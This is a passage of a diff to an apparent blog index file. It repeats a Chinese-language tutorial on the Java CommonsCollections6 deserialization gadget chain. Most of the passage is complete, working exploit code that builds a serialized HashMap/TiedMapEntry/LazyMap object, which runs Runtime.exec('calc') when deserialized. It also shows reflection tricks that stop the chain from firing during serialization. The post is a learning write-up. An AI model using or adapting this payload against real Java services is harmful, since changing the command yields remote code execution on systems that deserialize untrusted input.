class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">//改法一:先把不把transformers放进chainedTransformer中，这里new了个ConstantTransformer[]&#123;&#125;，ChainedTransformer就调用不了transformers</span><br><span class="hljs-comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(new ConstantTransformer[]&#123;&#125;);</span><br><br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><span class="hljs-comment">//        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><br>        <span class="hljs-comment">//改法二:先不把chainedTransformer放进LazyMap.decorate()，这样lazyMap也找不到后半条链</span><br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br><span class="hljs-comment">//        lazyMap.remove(&quot;aaa&quot;);</span><br><br>        <span class="hljs-comment">//改法一：通过反射将transformers放进chainedTransformer中</span><br><span class="hljs-comment">//        Class&lt;ChainedTransformer&gt; c2 = ChainedTransformer.class;</span><br><span class="hljs-comment">//        Field iTransformersField = c2.getDeclaredField(&quot;iTransformers&quot;);</span><br><span class="hljs-comment">//        iTransformersField.setAccessible(true);</span><br><span class="hljs-comment">//        iTransformersField.set(chainedTransformer, transformers);</span><br><br>        <span class="hljs-comment">//改法二：通过反射将chainedTransformer放进lazyMap中</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazyMap, chainedTransformer);<br><br><br><br><br>        <span class="hljs-comment">//生成序列化字符串</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(map2);<br>        oos.close();<br><br>        <span class="hljs-comment">//本地测试触发</span><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> ois.readObject();<br><br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="遇到一个小问题"><a href="#遇到一个小问题" class="headerlink" title="遇到一个小问题"></a>遇到一个小问题</h3><p>发现这时候反序列化不能成功执行</p>
+<p>我们可以尝试调试一下，添加一个lnline Watches，可以看到执行的时候<code>map.put(key，value)</code>把<code>key:&quot;aaa&quot;</code>put进去了，导致我们反序列化得时候<code>if(map.containsKey(key) == false)</code>判定失败，因为这时候<code>if(map.containsKey(key)==true)</code>，然后就走不进这个if，导致调用<code>transform()</code>方法失败，最终导致链不能成功执行。</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525204315232.png" alt="image-20240525204315232"></p>
+<p>解决方法很简单，等put完后，<code>remove()</code>掉就行，随后就可以正常执行反序列化</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525163825585.png" alt="image-20240525163825585"></p>
+<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">//改法一:先把不把transformers放进chainedTransformer中，这里new了个ConstantTransformer[]&#123;&#125;，ChainedTransformer就调用不了transformers</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>[]&#123;&#125;);<br><br><br><span class="hljs-comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br><br>        <span class="hljs-comment">//改法二:先不把chainedTransformer放进LazyMap.decorate()，这样lazyMap也找不到后半条链</span><br><span class="hljs-comment">//        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));</span><br><br><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">//改法一：通过反射将transformers放进chainedTransformer中</span><br>        Class&lt;ChainedTransformer&gt; c2 = ChainedTransformer.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">iTransformersField</span> <span class="hljs-operator">=</span> c2.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersField.setAccessible(<span class="hljs-literal">true</span>);<br>        iTransformersField.set(chainedTransformer, transformers);<br><br>        <span class="hljs-comment">//改法二：通过反射将chainedTransformer放进lazyMap中</span><br><span class="hljs-comment">//        Class c = LazyMap.class;</span><br><span class="hljs-comment">//        Field factoryField = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="hljs-comment">//        factoryField.setAccessible(true);</span><br><span class="hljs-comment">//        factoryField.set(lazyMap, chainedTransformer);</span><br><br><br><br><br>        <span class="hljs-comment">//生成序列化字符串</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(map2);<br>        oos.close();<br><br>        <span class="hljs-comment">//本地测试触发</span><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br><span class="hljs-comment">//        Object o = ois.readObject();</span><br><br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.bilibili.com/video/BV1yP4y1p7N7/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化CommonsCollections篇(二)-最好用的CC链</a></p>
 ]]></content>
       <categories>
         <category>JAVA</category>
@@ -613,58 +665,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Java反序列化CommonsCollections篇-CC6(最好用的CC链)</title>
-    <url>/2024/05/25/JAVA%E5%AE%89%E5%85%A8/CC6/</url>
-    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
-<li><p>JAVA版本JAVA 21</p>
-</li>
-<li><p>commons-collections 3.2.1</p>
-</li>
-</ul>
-<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>
-
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CC1现在来说的话比较鸡肋。因为在8u71以后<code>AnnotationInvocationHandler.readObject()</code>改变了。</p>
-<p>为了解决高版本的利用问题ysoserial给出了解决方案CommonsCollections6，也就是我们平常称的CC6。</p>
-<p>其实后面利用链和CC1是一样的,<code>LazyMap.get()</code></p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525145206477.png" alt="image-20240525145206477"></p>
-<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>从ysoserial可以看出链首是HashMap，其实HashMap我们挺熟悉。<code>HashMap.readObject()-&gt;HashMap.put()-&gt;HashMap.hash().(key)HashCode()</code></p>
-<p>所以现在只需要有一个类的<code>HashCode()</code>调用了<code>get()</code>就可以将这整段链链接起来。</p>
-<h3 id="攻击链分析"><a href="#攻击链分析" class="headerlink" title="攻击链分析"></a>攻击链分析</h3><p>作者是发现了<code>TiedMapEntry.HashCode().getValue()</code>中调用了<code>get()</code>,那这就可以把前后两段链链接起来。</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525163703284.png" alt="image-20240525163703284"></p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525163727555.png" alt="image-20240525163727555"></p>
-<p>完整利用链</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/CC6.png" alt="CC6"></p>
-<h3 id="实现攻击链"><a href="#实现攻击链" class="headerlink" title="实现攻击链"></a>实现攻击链</h3><p>后面代码执行的部分和CC1是一样的，复制就行</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <br>    <br>    	<span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br></code></pre></td></tr></table></figure>
-
-<p>接下来直接<code>new TiedMapEntry</code>，看<code>TiedMapEntry</code>的构造器，所以map可以直接传入之前的chainedTransformer，key随便传。</p>
-<p>然后<code>new HashMap</code>作为入口，放入把tiedMapEntry放进key。为什么把tiedMapEntry放进key而不是放进value中？因为<code>HashMap.readObject</code>是对key进行<code>hash()</code>。同样的value随便传。</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525162706680.png" alt="image-20240525162706680"></p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525162851644.png" alt="image-20240525162851644"></p>
-<p>但是我们在URLDNS那条链里面就有经验了，<code>HashMap.put</code>就会对key进行<code>hash()</code>，也就是对key调用<code>hashCode()</code>，会直接导致在序列化的时候直接走完这条链。</p>
-<p>所以得更改一下，改法很多，思路其实都是一样的，put时放进一个不能让链连接起来的对象或者方法，序列化的时候改回设想的调用链，让链能连接起来。</p>
-<p>这里主要写了两种方式:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">//改法一:先把不把transformers放进chainedTransformer中，这里new了个ConstantTransformer[]&#123;&#125;，ChainedTransformer就调用不了transformers</span><br><span class="hljs-comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(new ConstantTransformer[]&#123;&#125;);</span><br><br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><span class="hljs-comment">//        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><br>        <span class="hljs-comment">//改法二:先不把chainedTransformer放进LazyMap.decorate()，这样lazyMap也找不到后半条链</span><br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br><span class="hljs-comment">//        lazyMap.remove(&quot;aaa&quot;);</span><br><br>        <span class="hljs-comment">//改法一：通过反射将transformers放进chainedTransformer中</span><br><span class="hljs-comment">//        Class&lt;ChainedTransformer&gt; c2 = ChainedTransformer.class;</span><br><span class="hljs-comment">//        Field iTransformersField = c2.getDeclaredField(&quot;iTransformers&quot;);</span><br><span class="hljs-comment">//        iTransformersField.setAccessible(true);</span><br><span class="hljs-comment">//        iTransformersField.set(chainedTransformer, transformers);</span><br><br>        <span class="hljs-comment">//改法二：通过反射将chainedTransformer放进lazyMap中</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazyMap, chainedTransformer);<br><br><br><br><br>        <span class="hljs-comment">//生成序列化字符串</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(map2);<br>        oos.close();<br><br>        <span class="hljs-comment">//本地测试触发</span><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> ois.readObject();<br><br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
-
-<h3 id="遇到一个小问题"><a href="#遇到一个小问题" class="headerlink" title="遇到一个小问题"></a>遇到一个小问题</h3><p>发现这时候反序列化不能成功执行</p>
-<p>我们可以尝试调试一下，添加一个lnline Watches，可以看到执行的时候<code>map.put(key，value)</code>把<code>key:&quot;aaa&quot;</code>put进去了，导致我们反序列化得时候<code>if(map.containsKey(key) == false)</code>判定失败，因为这时候<code>if(map.containsKey(key)==true)</code>，然后就走不进这个if，导致调用<code>transform()</code>方法失败，最终导致链不能成功执行。</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525204315232.png" alt="image-20240525204315232"></p>
-<p>解决方法很简单，等put完后，<code>remove()</code>掉就行，随后就可以正常执行反序列化</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525163825585.png" alt="image-20240525163825585"></p>
-<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">//改法一:先把不把transformers放进chainedTransformer中，这里new了个ConstantTransformer[]&#123;&#125;，ChainedTransformer就调用不了transformers</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>[]&#123;&#125;);<br><br><br><span class="hljs-comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br><br>        <span class="hljs-comment">//改法二:先不把chainedTransformer放进LazyMap.decorate()，这样lazyMap也找不到后半条链</span><br><span class="hljs-comment">//        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));</span><br><br><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">//改法一：通过反射将transformers放进chainedTransformer中</span><br>        Class&lt;ChainedTransformer&gt; c2 = ChainedTransformer.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">iTransformersField</span> <span class="hljs-operator">=</span> c2.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersField.setAccessible(<span class="hljs-literal">true</span>);<br>        iTransformersField.set(chainedTransformer, transformers);<br><br>        <span class="hljs-comment">//改法二：通过反射将chainedTransformer放进lazyMap中</span><br><span class="hljs-comment">//        Class c = LazyMap.class;</span><br><span class="hljs-comment">//        Field factoryField = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="hljs-comment">//        factoryField.setAccessible(true);</span><br><span class="hljs-comment">//        factoryField.set(lazyMap, chainedTransformer);</span><br><br><br><br><br>        <span class="hljs-comment">//生成序列化字符串</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(map2);<br>        oos.close();<br><br>        <span class="hljs-comment">//本地测试触发</span><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br><span class="hljs-comment">//        Object o = ois.readObject();</span><br><br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
-
-
-
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.bilibili.com/video/BV1yP4y1p7N7/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化CommonsCollections篇(二)-最好用的CC链</a></p>
-]]></content>
-      <categories>
-        <category>JAVA</category>
-      </categories>
-      <tags>
-        <tag>JAVA安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>JAVA反序列化</title>
     <url>/2024/05/21/JAVA%E5%AE%89%E5%85%A8/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
     <content><![CDATA[<h2 id="为什么JAVA需要反序列化"><a href="#为什么JAVA需要反序列化" class="headerlink" title="为什么JAVA需要反序列化"></a>为什么JAVA需要反序列化</h2><p><strong>1. 数据持久化</strong></p>
@@ -688,6 +688,66 @@
 <h2 id="寻找入口类"><a href="#寻找入口类" class="headerlink" title="寻找入口类"></a>寻找入口类</h2><p>怎么算是一个好的入口类？实现了<code>Serializable</code>接口,重写了readObject，参数类型宽泛，最好JDK自带。</p>
